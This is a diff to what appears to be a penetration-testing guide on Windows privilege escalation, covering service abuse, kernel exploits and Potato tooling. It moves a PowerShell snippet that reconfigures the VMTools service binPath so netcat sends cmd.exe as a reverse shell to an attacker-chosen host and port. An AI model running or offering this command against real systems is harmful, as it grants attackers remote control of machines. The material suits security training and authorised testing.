@@ -304,6 +304,16 @@ move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 ```
 
+If user belongs to Server Operators or similar group with high privileges. 
+
+```powershell
+whoami /groups 
+
+sc.exe config VMTools binPath="C:\Users\{{USERNAME}}\desktop\nc.exe -e cmd.exe {{LHOST}} {{LPORT}}"
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+
 ## 17.3.2 Using exploits
 
 > Three exploit families for privesc: **application vulnerabilities** (in installed software running privileged), **kernel exploits** (powerful but crash-prone — verify patch level first, and test on a clone before using in a real engagement), and **privilege abuse** (e.g. `SeImpersonatePrivilege` via named-pipe "Potato" tooling).
@@ -326,10 +336,6 @@ Run a matched, source-available kernel exploit (verify the CVE against the missi
 
 ```powershell
 whoami /priv                          # confirm SeImpersonatePrivilege: Enabled
-
-sc.exe config VMTools binPath="C:\Users\\{{USERNAME}}\desktop\nc.exe -e cmd.exe {{LHOST}} {{LPORT}}"
-sc.exe stop VMTools
-sc.exe start VMTools
 ```
 
 **Which Potato for which Windows build** — the variant matters because Microsoft killed the older
